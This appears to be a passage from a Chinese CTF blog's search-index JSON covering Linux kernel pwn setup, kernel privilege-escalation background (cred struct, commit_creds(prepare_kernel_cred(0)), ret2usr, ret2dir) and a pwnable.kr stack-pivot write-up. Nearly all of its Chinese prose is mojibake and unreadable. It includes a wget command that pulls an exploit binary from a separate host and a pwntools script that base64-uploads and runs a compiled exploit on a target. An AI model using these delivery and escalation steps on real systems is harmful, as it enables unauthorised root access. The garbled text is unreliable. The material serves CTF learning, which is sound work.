/bin/sh\n\n2.file.koæ–‡ä»¶ï¼šä¸€èˆ¬è¿™ä¸ªå°±ç›¸å½“äºæ˜¯å¸¸è§„pwnçš„binaryæ–‡ä»¶ï¼Œæ¼æ´åº”è¯¥åœ¨è¿™é‡Œé¢ï¼Œå¯ä»¥ç”¨IDAæ‰“å¼€æ¥åˆ†æã€‚\n\n3.vmlinuxï¼šé¢˜ç›®æ²¡ç›´æ¥ç»™çš„ï¼Œä¸€èˆ¬cpioå‹ç¼©åŒ…ä¸­éƒ½ä¼šæœ‰ï¼Œå¯ä»¥ç”¨æ¥æŸ¥gadgetã€‚\n\ntime ropper --file ./vmlinux --nocolor > g1\n\ntime ROPgadget --binary ./vmlinux > g2\n\næ²¡æœ‰çš„ä¹Ÿå¯ä»¥æå–å‡ºæ¥ï¼š\n\n./extract-vmlinux ./bzImage > vmlinux\n\n(extract-vmlinuxæ–‡ä»¶ï¼šhttps://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux )\n\n4.å…¶å®ƒçš„å°±æ²¡ä»€ä¹ˆé‡è¦çš„äº†ï¼Œç„¶åæœ‰çš„é¢˜ç›®ä¼šæœ‰gen_cpio.shç›¸å…³æ–‡ä»¶ï¼Œç”¨æ¥ç”Ÿæˆcpioæ–‡ä»¶ï¼Œè¿™æ—¶å€™å°±ç›´æ¥ä½¿ç”¨ï¼Œå¦‚æœç”¨find ./* | cpio -H newc -o > file.cpioå¯èƒ½å¹¶ä¸å¤ªå¥½ä½¿ã€‚\n\n \n\n \n\nä¸‰ã€gdbè°ƒè¯•ï¼š\n\n1.start.shä¸­è®¾ç½®-sæˆ–è€…-gdb tcp::1234\n\n2.è®¾ç½®initä¸­çš„setsidï¼Œè®¾ç½®ä¸ºrootæƒé™\n\n3.åŠ è½½ç¬¦å·è¡¨ï¼š\n\n(1)qemuå†…ï¼š\n\ncat /sys/module/core/sections/.text  //æ‰¾åˆ°åŸºåœ°å€\n\n0xffffffffc018b000\n\n(2)qemuå¤–ï¼š\n\ngdb ./vmlinux -q\n\nadd-symbol-file ./file.ko 0xffffffffc018b000\n\n(ç°åœ¨å°±å¯ä»¥å¯¹å‡½æ•°ä¸‹æ–­ç‚¹ï¼šb core_readï¼Œæˆ–è€…æ ¹æ®file.koæ–‡ä»¶ä¸­çš„å‡½æ•°åç§»åŠ ä¸ŠåŸºåœ°å€ã€‚)\n\n4.è¿æ¥åˆ°qemuå†…éƒ¨çš„æ–‡ä»¶ï¼š\n\nqemuå¤–çš„gdbä¸­è¾“å…¥ï¼š\n\ntarget remote localhost:1234\n\nä¹‹åå°±å¯ä»¥äº’åŠ¨ï¼Œé€šè¿‡ç¼–å†™expå¯åŠ¨æ¥è§¦å‘æ–­ç‚¹ã€‚\n\n \n\n \n\nå››ã€ææƒï¼š\n\n(1)æœ¬åœ°ï¼š\n\nå°†ç¼–è¯‘åçš„exploitæ”¾åˆ°åˆå§‹æ ¹ç›®å½•æ–‡ä»¶ç³»ç»Ÿä¸­/temä¸­ï¼Œå†æ¬¡æ‰“åŒ…ç”Ÿæˆcpioæ–‡ä»¶ï¼Œè¿è¡Œqemuï¼Œä¹‹åè¿è¡Œexploitå³å¯ã€‚\n\n(2)è¿œç¨‹ï¼š\n\næœ¬åœ°å†™å¥½ exploit åï¼Œå¯ä»¥é€šè¿‡ base64 ç¼–ç ç­‰æ–¹å¼æŠŠç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¿å­˜åˆ°è¿œç¨‹ç›®å½•ä¸‹ï¼Œè¿›è€Œæ‹¿åˆ° flagã€‚åŒæ—¶å¯ä»¥ä½¿ç”¨ musl, uclibc ç­‰æ–¹æ³•å‡å° exploit çš„ä½“ç§¯æ–¹ä¾¿ä¼ è¾“ã€‚\n\nç¼–è¯‘ï¼šgcc exploit.c -static -masm=intel -g -o exploit\n\nå¯ä»¥ç”¨pythoné…ä¸Šbusyboxæ¥è®¾ç½®ï¼š\n\nâ‘ åœ¨æœ¬åœ°æœ‰exploitçš„æ–‡ä»¶å¤¹ä¸‹è¿è¡Œï¼špython2 -m SimpleHTTPServer\n\nè®°ä½æœ¬åœ°ipï¼Œç«¯å£ä¸º8000\n\nâ‘¡åœ¨è¿œç¨‹ä¸­è¿è¡Œï¼šwget -O ./exploit http://192.168.80.132:8000/exploit\n\nè¿™æ ·å°±å¯ä»¥é€šè¿‡ç½‘ç»œæ¥ä¼ è¾“exploit\n\n(3)çœŸå®é¢˜ç›®ç¯å¢ƒå¯èƒ½æ²¡æœ‰ç½‘ç»œï¼Œè¿™æ—¶å€™éœ€è¦ç”¨åˆ°è„šæœ¬ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nimport os\n\n# context.log_level = 'debug'\ncmd = '# '\n\ndef exploit(r):\n    r.sendlineafter(cmd, 'stty -echo')\n    os.system('musl-gcc -static -O2 ./poc/exp.c -o ./poc/exp')\n    os.system('gzip -c ./poc/exp > ./poc/exp.gz')\n    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')\n    r.sendline((read('./poc/exp.gz')).encode('base64'))\n    r.sendline('EOF')\n    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')\n    r.sendlineafter(cmd, 'gunzip ./exp.gz')\n    r.sendlineafter(cmd, 'chmod +x ./exp')\n    r.sendlineafter(cmd, './exp')\n    r.interactive()\n\n\np = process('./boot.sh', shell=True)\n# p = remote('127.0.0.1',0000 )\n\nexploit(p)\n```\n\nè¿™é‡Œéœ€è¦åœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª poc æ–‡ä»¶å¤¹ï¼ŒæŠŠ exp.c æ–‡ä»¶æ”¾è¿›å»ï¼Œæˆ–è€…è‡ªå·±ä¿®æ”¹ä¸‹è„šæœ¬ä¹Ÿå¯ä»¥ï¼Œå¦å¤–è¿˜éœ€è¦å®‰è£…musl-gccï¼Œåœ¨ubuntuä¸‹ï¼šapt-get install musl-tools\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191511955.jpeg)\n\nè¿™æ˜¯sixstars æˆ˜é˜Ÿä¸­ä¸€ä½å¸ˆå‚…çš„è„šæœ¬ï¼Œä¸çŸ¥é“æ˜¯å“ªä½å¤§ä½¬çš„ã€‚\n\n \n","tags":["Kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwn-kernel_å‰ç½®çŸ¥è¯†","url":"/2021/08/14/pwn-kernel_å‰ç½®çŸ¥è¯†/","content":"\nä¸€ã€å†…æ ¸å‰ç½®åŸºç¡€çŸ¥è¯†ï¼š\n\n1.physmapï¼š\n\nphysmapæ˜¯å†…æ ¸ç®¡ç†çš„ä¸€å—éå¸¸å¤§çš„è¿ç»­çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œä¸ºäº†æé«˜æ•ˆç‡ï¼Œè¯¥ç©ºé—´åœ°å€å’ŒRAMåœ°å€ç›´æ¥æ˜ å°„ã€‚RAMç›¸å¯¹physmapè¦å°å¾—å¤šï¼Œå¯¼è‡´äº†ä»»ä½•ä¸€ä¸ªRAMåœ°å€éƒ½å¯ä»¥åœ¨physmapä¸­æ‰¾åˆ°å…¶å¯¹åº”çš„è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œè€Œç”¨æˆ·ç©ºé—´çš„è™šæ‹Ÿå†…å­˜ä¹Ÿä¼šæ˜ å°„åˆ°RAMã€‚\n\næ‰€ä»¥å¯èƒ½ä¼šå½¢æˆå¦‚ä¸‹å…³ç³»ï¼š\n\nusr_data--->RAM---->physmap\n\né‚£ä¹ˆphysmapä¸­å°±æœ‰å¯èƒ½ä¼šä¿å­˜usr_dataï¼Œé‚£ä¹ˆå°±ä¸ºææƒä»£ç æ”¾åˆ°å†…æ ¸ç©ºé—´æä¾›äº†å‰ç½®æ¡ä»¶ï¼ŒåŒæ—¶æœ‰mmapå°±å¯èƒ½ä¼šå¯¼è‡´æ¡ä»¶ç«äº‰ã€‚\n\n \n\n2.ioctlï¼šç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºä¸è®¾å¤‡é€šä¿¡\n\nç”±äºå†…æ ¸å’Œç”¨æˆ·ç©ºé—´éš”ç¦»å¼€ï¼Œæ‰€ä»¥å°±éœ€è¦ä¸€ä¸ªæ¥å£æ¥ä½¿å¾—ç”¨æˆ·å¯ä»¥åœ¨ä¸€å®šæƒ…å†µä¸‹è®¿é—®å†…æ ¸ç©ºé—´ï¼š\n\nint ioctl(int fd, unsigned long request, ...)\n\nç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ‰“å¼€è®¾å¤‡ (open) è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„æ§åˆ¶å‘½ä»¤ï¼Œå†åè¾¹çš„å‚æ•°åˆ™æ˜¯ä¸€äº›è¡¥å……å‚æ•°ï¼Œä¸è®¾å¤‡æœ‰å…³ã€‚\n\n \n\n \n\n3.çŠ¶æ€è½¬æ¢ç›¸å…³æ“ä½œï¼š\n\nå½“å‘ç”Ÿç³»ç»Ÿè°ƒç”¨ï¼Œäº§ç”Ÿå¼‚å¸¸ï¼Œå¤–è®¾äº§ç”Ÿä¸­æ–­ç­‰äº‹ä»¶æ—¶ï¼Œä¼šå‘ç”Ÿç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢\n\nENTRY(entry_SYSCALL_64)\n\n(1).ç”¨æˆ·æ€è‡³å†…æ ¸æ€ï¼š\n\nâ‘ swapgsæŒ‡ä»¤è§¦å‘ï¼Œåˆ‡æ¢åˆ°kernel GSï¼š\n\nSWAPGS_UNSAFE_STACK\n\nâ‘¡ä¿å­˜æ ˆå€¼ï¼Œè®¾ç½®å†…æ ¸æ ˆï¼š\n\nmovq %rsp, PER_CPU_VAR(rsp_scratch)\n\nmovq PER_CPU_VAR(cpu_current_top_of_stack), %rsp\n\nâ‘¢å‹æ ˆä¿å­˜å¯„å­˜å™¨ï¼š\n\n```\n#æ³¨é‡Šå¤´ \n\n/* Construct struct pt_regs on stack */\npushq  $__USER_DS      /* pt_regs->ss */\npushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */\npushq  %r11             /* pt_regs->flags */\npushq  $__USER_CS      /* pt_regs->cs */\npushq  %rcx             /* pt_regs->ip */\npushq  %rax             /* pt_regs->orig_ax */\npushq  %rdi             /* pt_regs->di */\npushq  %rsi             /* pt_regs->si */\npushq  %rdx             /* pt_regs->dx */\npushq  %rcx tuichu    /* pt_regs->cx */\npushq  $-ENOSYS        /* pt_regs->ax */\npushq  %r8              /* pt_regs->r8 */\npushq  %r9              /* pt_regs->r9 */\npushq  %r10             /* pt_regs->r10 */\npushq  %r11             /* pt_regs->r11 */\nsub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */\n```\n\nâ‘£åˆ¤æ–­ç±»å‹å¹¶è·³è½¬ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmovq PER_CPU_VAR(current_task), %r11\ntestl $_TIF_WORK_SYSCALL_ENTRY|_TIF_ALLWORK_MASK, TASK_TI_flags(%r11)\njnz entry_SYSCALL64_slow_path\n```\n\nâ–²\n\n```\n#æ³¨é‡Šå¤´\n\nentry_SYSCALL64_slow_path:\n  /* IRQs are off. */\n  SAVE_EXTRA_REGS\n  movq    %rsp, %rdi\n  call    do_syscall_64        /* returns with IRQs disabled */\n```\n\n(2)å†…æ ¸æ€è‡³ç”¨æˆ·æ€ï¼š\n\nâ‘ swapgsæ¢å¤GS\n\nâ‘¡iretqï¼ˆåŠ ä¸Šå¯„å­˜å™¨ä¿¡æ¯ï¼‰æˆ–sysretqï¼Œå¦‚æœä½¿ç”¨ iretq è¿˜éœ€è¦ç»™å‡ºç”¨æˆ·ç©ºé—´çš„ä¸€äº›ä¿¡æ¯ï¼ˆCS, eflags/rflags, esp/rsp ç­‰ï¼‰\n\nkernel çš„ crash é€šå¸¸ä¼šå¼•èµ·é‡å¯\n\n \n\n \n\n4.ç›¸å…³ä¿æŠ¤æŠ€æœ¯Mitigationï¼š\n\n(1)SMAPå’ŒSMEPä¿æŠ¤æŠ€æœ¯ï¼š\n\n(armé‡Œé¢å«PXN(Privilege Execute Never)å’ŒPAN(Privileged Access Never))\n\nâ‘ SMAP:ç¦æ­¢å†…æ ¸è®¿é—®ç”¨æˆ·ç©ºé—´çš„æ•°æ®(Supervisor Mode Access Prevention)\n\nâ‘¡SMEP:ç¦æ­¢å†…æ ¸æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç (Supervisor Mode Execution Prevention)\n\nå†…æ ¸å‘½ä»¤è¡Œä¸­æ·»åŠ nosmapå’Œnosmepç¦ç”¨\n\n(2)kernel canary:\n\nç¼–è¯‘å†…æ ¸æ—¶è®¾ç½®CONFIG_CC_STACKPROTECTORï¼Œå¯ä»¥èµ·åˆ°ç±»ä¼¼äºstack canaryçš„æŠ€æœ¯ã€‚\n\n(3)KALSRï¼šå†…æ ¸åœ°å€éšæœºåŒ–\n\n \n\n \n\n5.ææƒä»£ç ä¸å‡½æ•°ç»“æ„ä½“ï¼š\n\ncredç»“æ„ä½“ï¼škernelç”¨credç»“æ„ä½“è®°å½•è¿›ç¨‹æƒé™(æ¯ä¸ªç»“æ„éƒ½æœ‰ä¸€ä¸ªcredç»“æ„)ï¼Œä¿å­˜äº†è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚æœåˆ©ç”¨è¿™ä¸ªcredå°±å¯ä»¥ææƒã€‚ä¸€èˆ¬è°ƒç”¨commit_creds(prepare_kernel_cred(0))å®Œæˆææƒç„¶åç”¨æˆ·æ€â€œç€é™†â€èµ·shellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nstruct cred {\n    atomic_t    usage;\n#ifdef CONFIG_DEBUG_CREDENTIALS\n    atomic_t    subscribers;           /* number of processes subscribed */\n    void        *put_addr;\n    unsigned    magic;\n#define CRED_MAGIC  0x43736564\n#define CRED_MAGIC_DEAD 0x44656144\n#endif\n    kuid_t      uid;                   /* real UID of the task */\n    kgid_t      gid;                   /* real GID of the task */\n    kuid_t      suid;                  /* saved UID of the task */\n    kgid_t      sgid;                  /* saved GID of the task */\n    kuid_t      euid;                  /* effective UID of the task */\n    kgid_t      egid;                  /* effective GID of the task */\n    kuid_t      fsuid;                 /* UID for VFS ops */\n    kgid_t      fsgid;                 /* GID for VFS ops */\n    unsigned    securebits;            /* SUID-less security management */\n    kernel_cap_t    cap_inheritable;   /* caps our children can inherit */\n    kernel_cap_t    cap_permitted;     /* caps we're permitted */\n    kernel_cap_t    cap_effective;     /* caps we can actually use */\n    kernel_cap_t    cap_bset;          /* capability bounding set */\n    kernel_cap_t    cap_ambient;       /* Ambient capability set */\n#ifdef CONFIG_KEYS\n    unsigned char   jit_keyring;       /* default keyring to attach requested\n    /* keys to */\n    struct key __rcu *session_keyring; /* keyring inherited over fork */\n    struct key  *process_keyring;      /* keyring private to this process */\n    struct key  *thread_keyring;       /* keyring private to this thread */\n    struct key  *request_key_auth;     /* assumed request_key authority */\n#endif\n#ifdef CONFIG_SECURITY\n    void        *security;             /* subjective LSM security */\n#endif\n    struct user_struct *user;          /* real user ID subscription */\n    struct user_namespace *user_ns;    /* user_ns the caps and keyrings are relative to. */\n    struct group_info *group_info;     /* supplementary groups for euid/fsgid */\n    struct rcu_head rcu;               /* RCU deletion hook */\n} __randomize_layout;\n```\n\nä¸åŒå†…æ ¸ç‰ˆæœ¬çš„credç»“æ„ä½“å¯èƒ½ä¸å¤ªä¸€æ ·ã€‚\n\n \n\näºŒã€å†…æ ¸æ€å‡½æ•°åŠç›¸å…³å˜åŒ–ï¼š\n\n1.printf() -> printk()ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ printk() ä¸ä¸€å®šä¼šæŠŠå†…å®¹æ˜¾ç¤ºåˆ°ç»ˆç«¯ä¸Šï¼Œä½†ä¸€å®šåœ¨å†…æ ¸ç¼“å†²åŒºé‡Œï¼Œå¯ä»¥é€šè¿‡ dmesg æŸ¥çœ‹æ•ˆæœ\n\n2.malloc() -> kmalloc()ï¼Œå†…æ ¸æ€çš„å†…å­˜åˆ†é…å‡½æ•°ï¼Œå’Œmalloc()ç›¸ä¼¼ï¼Œä½†ä½¿ç”¨çš„æ˜¯slab/slubåˆ†é…å™¨ã€‚\n\n3.free() -> kfree()ï¼ŒåŒ kmalloc()\n\n4.memcpy() -> copy_from_user()/copy_to_user()\n\n5.copy_from_user() å®ç°äº†å°†ç”¨æˆ·ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°å†…æ ¸ç©ºé—´\n\n6.copy_to_user() å®ç°äº†å°†å†…æ ¸ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°ç”¨æˆ·ç©ºé—´\n\n7.ææƒç›¸å…³å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nint commit_creds(struct cred *new)\nstruct cred* prepare_kernel_cred(struct task_struct* daemon)\n```\n\næ‰§è¡Œcommit_creds(prepare_kernel_cred(0))å³å¯è·å¾— root æƒé™\n\nå‡½æ•°åœ°å€å¯åœ¨/proc/kallsymsï¼Œè€ç‰ˆæœ¬/proc/ksymsä¸­æŸ¥çœ‹(cat|grep)ï¼Œæƒé™ä¸€èˆ¬éœ€è¦root\n\n \n\n \n\nä¸‰ã€ä¿æŠ¤ç»•è¿‡æŠ€æœ¯ï¼š\n\n1.ret2usr:\n\nåœ¨æ²¡æœ‰SMAP/SMEPçš„æƒ…å†µä¸‹æŠŠå†…æ ¸æŒ‡é’ˆé‡å®šå‘åˆ°ç”¨æˆ·ç©ºé—´çš„æ¼æ´åˆ©ç”¨æ–¹å¼è¢«ç§°ä¸ºret2usr\n\n2.ret2dirï¼š\n\nå¦‚æœç”¨æˆ·ç©ºé—´ç”¨mmap()æŠŠææƒä»£ç æ˜ å°„åˆ°å†…å­˜RAMï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨physmapé‡Œæ‰¾åˆ°å…¶å¯¹åº”çš„å‰¯æœ¬ï¼Œå°±å¯ä»¥ä¿®æ”¹EIPè·³åˆ°å‰¯æœ¬æ‰§è¡Œï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼è¢«ç§°ä¸ºret2dirã€‚\n\n3.kernel canary:\n\nç»•è¿‡æ–¹æ³•åŒç”¨æˆ·ç©ºé—´çš„canaryç»•è¿‡å¤§è‡´ç›¸åŒï¼Œç¼–è¯‘å†…æ ¸æ—¶è®¾ç½®CONFIG_CC_STACKPROTECTORï¼Œå¯ä»¥èµ·åˆ°ç±»ä¼¼äºstack canaryçš„æŠ€æœ¯ã€‚\n\n \n\n \n\n \n\n \n\n \n","tags":["Kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwnable.kr-login","url":"/2021/08/14/pwnable.kr-login/","content":"\n1.å¸¸è§„checksecä¸€ä¸‹ï¼Œå¼€äº†canaryå’ŒNXï¼Œç„¶åIDAæ‰“å¼€åˆ†ææ¼æ´ã€‚å‘ç°authå‡½æ•°ä¸­å¯èƒ½å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nint v4; // [esp+20h] [ebp-8h]\n------------------------------------\nmemcpy(&v4, &input, a1);\n```\n\nå¦‚æœa1å¤§äº8hï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶inputï¼Œé‚£ä¹ˆå°±å¯ä»¥é€ æˆæ ˆæº¢å‡ºã€‚å†å¾€ä¸Šç¿»ä¸€ä¸‹ï¼Œå‘ç°å°±æ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥é€šè¿‡ä¸€ç³»åˆ—æ“ä½œç»™åˆ°inputï¼Œç„¶åa1æ˜¯inputçš„é•¿åº¦ã€‚\n\nå®é™…æƒ…å†µæ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥ç»™sï¼Œè¿›è¡ŒBase64è§£ç ï¼Œç„¶åç»™v4ï¼Œé•¿åº¦ç»™v6ã€‚v4åˆç»™inputï¼Œv6ä¼ å€¼åˆ°è¾¾authå‡½æ•°èµ‹å€¼ç»™a1ã€‚è¿™é‡Œinputæ˜¯å…¨å±€å˜é‡ï¼Œæ‰€ä»¥authå‡½æ•°ä¸­çš„inputä¸­çš„å†…å®¹å…¶å®å°±æ˜¯æˆ‘ä»¬è¾“å…¥ç»è¿‡base64è§£ç çš„å†…å®¹ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n_isoc99_scanf(\"%30s\", &s);\n--------------------------------------------------\nv6 = Base64Decode((int)&s, &v4);\n--------------------------------------------------\nmemcpy(&input, v4, v6);\n------------------------------------------------------\nauth(v6) == 1\n```\n\nâ–²é¢˜å¤–è¯ï¼šæœ€å¼€å§‹Base64æä¸æ‡‚å“ªä¸ªæ˜¯è¾“å…¥ï¼Œå“ªä¸ªæ˜¯è¾“å‡ºï¼Œç›´æ¥ç»è¿‡è°ƒè¯•å°±å¯ä»¥åˆ¤æ–­ã€‚å†µä¸”æœ€å¼€å§‹çš„v4æ˜¯0ï¼Œæ€»ä¸èƒ½ç¨‹åºæ°¸è¿œéƒ½å°†0è¿›è¡Œbase64è§£ç ç„¶ç»™åˆ°æˆ‘ä»¬çš„è¾“å…¥åœ°å€ä¸­å§ã€‚ä½†æ˜¯è°ƒè¯•çš„æ—¶å€™å‘ç°ï¼Œæ¯æ¬¡è¾“å…¥ç›¸åŒçš„å€¼ï¼Œä½†æ˜¯è§£ç åå¾—åˆ°çš„v4çš„å€¼å´æ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™å°±çº³é—·äº†ï¼Œä¸ºä»€ä¹ˆä¸€æ ·çš„è¾“å…¥å››ä¸ªAAAAå¾—åˆ°çš„è§£ç å€¼ä¸ä¸€æ ·å‘¢ï¼Œéš¾é“ç¨‹åºè¿˜æœ‰ä¸ªéšæœºå˜é‡ä¸æˆã€‚ä¹‹åå†ä»”ç»†è°ƒè¯•å‘ç°è¿™ä¸ªbase64decodeæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œè™½ç„¶ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯åœ°å€ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°çš„æ“ä½œå´æ˜¯ä»è¯¥åœ°å€ç›´æ¥å–å€¼è¿›è¡Œè§£ç ï¼Œç„¶åå¯¹äºç¬¬äºŒä¸ªå‚æ•°çš„æ“ä½œå´å¹¶ä¸æ˜¯å°†è§£ç ç»“æœç»™åˆ°ç¬¬äºŒä¸ªå‚æ•°ï¼Œè€Œæ˜¯å†å¼€è¾Ÿä¸€å—å †å†…å­˜ï¼Œä¹‹åå°†è¯¥å †å†…å­˜çš„åœ°å€ç»™åˆ°ç¬¬äºŒä¸ªå‚æ•°ã€‚æ‰€ä»¥æ¯æ¬¡è§£ç åç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªå€¼ï¼Œæ€»æ˜¯ä¸ä¸€æ ·ï¼Œå› ä¸ºè¿™é‡Œä¿å­˜çš„æ˜¯ä¸€ä¸ªéšæœºç”Ÿæˆçš„å †åœ°å€ï¼Œè€Œä¸æ˜¯è§£ç åçš„å€¼ã€‚åŒæ ·ä¹‹åè§‚å¯Ÿmainå‡½æ•°ä¸­çš„memcpyä¹Ÿå¯ä»¥å‘ç°ï¼šmemcpy(&input, v4, v6);è€Œmemcpyçš„åŸå‹æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nvoid *memcpy(void *dest, const void *src, size_t n)\n```\n\nå‰ä¸¤ä¸ªå‚æ•°ç±»å‹éƒ½åº”è¯¥æ˜¯åœ°å€æ‰å¯¹ï¼Œè€Œè¿™é‡Œå´ç›´æ¥å°†v4çš„å€¼ç»™ä¼ è¿›å»ï¼Œé‚£ä¸å°±è¯´æ˜v4çš„å€¼æ˜¯ä¸€ä¸ªåœ°å€å—ã€‚ç„¶åå†è·³è½¬åˆ°æ±‡ç¼–ä»£ç åˆ†æä¸€æ³¢:\n\n```\n#æ³¨é‡Šå¤´\n\n.text:080493B3   call _memset\n.text:080493B8   mov dword ptr [esp+18h], 0\n.text:080493C0   lea eax, [esp+18h]\n.text:080493C4   mov [esp+4], eax\n.text:080493C8   lea eax, [esp+1Eh]\n.text:080493CC   mov [esp], eax\n.text:080493CF   call Base64Decode\n```\n\nåŒæ ·Base64Decodeå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°ä¹Ÿéƒ½æ˜¯åœ°å€ï¼Œè¿™é‡Œæ˜¯ç›´æ¥å–æ ˆåœ°å€ç»™åˆ°eaxï¼Œç„¶åå†å°†eaxçš„å€¼ç»™ç›¸åº”espæŒ‡å‘çš„æ ˆå†…å­˜ã€‚æ‰€ä»¥å¯ä»¥çœ‹åˆ°Base64Decodeå–å€¼åº”è¯¥æ˜¯ä»æ ˆä¸Šå–ä¸¤ä¸ªåœ°å€æ‰å¯¹ï¼Œåˆ†åˆ«ä½äºmainå‡½æ•°æ ˆçš„æ˜¯esp+4å’Œespã€‚æ‰€ä»¥å¦‚æœè¿™é‡Œæœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²é‚£ä¹ˆå°±å®Œå…¨å¯ä»¥æ³„éœ²å¤„å‡ºæ ˆåœ°å€ï¼Œä¹‹åå°±å®Œå…¨å¯æ§ï¼Œå¯æƒœæ²¡æœ‰ã€‚è¿˜æ˜¯å›åˆ°æ­£è½¨åˆ†æå§ã€‚\n\n2.æ‰€ä»¥ç»è¿‡å‰é¢åˆ†æï¼Œç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªbase64ç¼–ç è¿‡çš„å­—ç¬¦ä¸²ï¼Œéšåä¼šè¿›è¡Œè§£ç å¹¶ä¸”å¤åˆ¶åˆ°ä½äºbssæ®µçš„å…¨å±€å˜é‡inputä¸­ï¼Œæœ€åä½¿ç”¨authå‡½æ•°è¿›è¡ŒéªŒè¯ï¼Œé€šè¿‡åè¿›å…¥å¸¦æœ‰åé—¨çš„correct()æ‰“å¼€shellã€‚å¹¶ä¸”ç”±äºé•¿åº¦æœ‰é™åˆ¶ï¼šæ‰€ä»¥æˆ‘ä»¬çš„è¾“å…¥base64è§£ç åæœ€å¤šåªèƒ½æœ‰12ä¸ªå­—èŠ‚ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nif ( v6 > 12 )\n{\n    puts(\"Wrong Length\");\n}\n```\n\n3.æ±‡æ€»ä¸€ä¸‹ï¼Œç¨‹åºå­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†åªèƒ½æº¢å‡º4ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯æœ€å¤šåªèƒ½è¦†ç›–åˆ°ebpï¼Œç„¶åå­˜åœ¨åé—¨å‡½æ•°ã€‚ç”±äºæ²¡åŠæ³•ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œå°±åœ¨ebpä¸Šåšæ–‡ç« ï¼Œä½¿ç”¨æ ˆåŠ«æŒæŠ€æœ¯ã€‚ä¹‹å‰çš„æ ˆåŠ«æŒå¯ä»¥ç”¨ropï¼Œä½†æ˜¯è¿™é‡Œæ²¡åŠæ³•ï¼Œå› ä¸ºæ— æ³•è¿›è¡Œè¿”å›åœ°å€è¦†ç›–ã€‚ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªåœ°æ–¹ï¼Œå°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥æœ€åä¼šè¢«è§£ç èµ‹å€¼ç»™inputï¼Œè¿™ä¸ªinputæ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œä¸å—åˆ°ASLRå½±å“ï¼Œè€Œåˆå¯ä»¥æ§åˆ¶12ä¸ªå­—èŠ‚ï¼Œå¦‚æœå¯ä»¥æŠŠæ ˆæŒªç§»åˆ°è¿™ä¸ªåœ°æ–¹ï¼Œé‚£ä¹ˆå°±æ˜¯å¯æ§äº†ã€‚\n\næ ˆæ¨¡å‹å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548702.png)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548716.png)\n\nå¯æ§æ ˆå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548659.png)\n\n4.æ€»ä½“æ€è·¯åº”è¯¥æ˜¯ï¼š\n\nâ‘ åŠ«æŒauthå‡½æ•°çš„æ ˆåº•åˆ°input_addrï¼Œé‚£ä¹ˆauthå‡½æ•°åœ¨é€€å‡ºåˆ°mainå‡½æ•°æ—¶ï¼Œmainå‡½æ•°æ ˆçš„æ ˆåº•å°±ä¸ä¼šå›åˆ°ä¹‹å‰çš„mainå‡½æ•°æ ˆæ ˆåº•ï¼Œè€Œæ˜¯ä¼šæŒªç§»åˆ°æˆ‘ä»¬input_addrï¼Œä¹Ÿå°±æ˜¯payload3çš„å€¼ã€‚\n\nâ‘¡å¼€å§‹æ‰§è¡Œauthå‡½æ•°ä¸­çš„é€€å‡ºæ“ä½œï¼Œåˆ°leaveæ—¶ï¼Œæ‰§è¡Œæ“ä½œleaveçš„ç¬¬ä¸€æ­¥æ±‡ç¼–æ“ä½œmov esp 